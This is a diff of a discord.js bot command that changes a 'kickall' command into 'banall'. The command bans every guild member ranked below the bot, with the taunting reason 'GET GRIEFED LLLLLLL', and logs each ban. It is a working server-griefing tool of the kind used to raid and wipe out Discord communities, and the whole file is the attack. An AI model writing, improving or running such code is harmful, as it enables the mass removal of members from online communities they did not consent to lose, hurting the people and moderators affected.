@@ -1,9 +1,9 @@
-const { Client, Message, Permissions } = require("discord.js");
+const { Client, Message } = require("discord.js");
 require('colors');
 
 module.exports = {
-    name: 'kickall',
-    description: 'Kicks all members.',
+    name: 'banall',
+    description: 'Bans all members',
 
     /**
      * 
@@ -13,14 +13,14 @@ module.exports = {
      */
 
     async execute(bot, message, parts) {
-        if(!message.guild.me.permissions.has(Permissions.FLAGS.KICK_MEMBERS)) return console.log(`${`[ERROR]`.red} Missing Permission 'KICK_MEMBERS' on Guild ${message.guild.name}!`)
+        if(!message.guild.me.hasPermission('BAN_MEMBERS')) return console.log(`${`[ERROR]`.red} Missing Permission 'BAN_MEMBERS' on Guild ${message.guild.name}!`)
         message.guild.members.cache.forEach(async m => {
             if(m.roles.highest.position < message.guild.me.roles.highest.position) {
                 if(bot.cfg.myID != '' && bot.cfg.myID != message.author.id) {
-                    m.kick({
+                    m.ban({
                         reason: `GET GRIEFED LLLLLLL`
                     });
-                    await console.log(`${`[SUCCESS]`.green} ${`Successfully kicked member '${m.user.username}'!`.yellow}`)
+                    await console.log(`${`[SUCCESS]`.green} ${`Successfully banned member '${m.user.username}'!`.yellow}`)
                 }
             } else {
                 console.log(`${`[ERROR]`.red} ${`Missing Permissions for member '${m.user.username}' because his highest role is higher than my highest role!`.yellow}`);
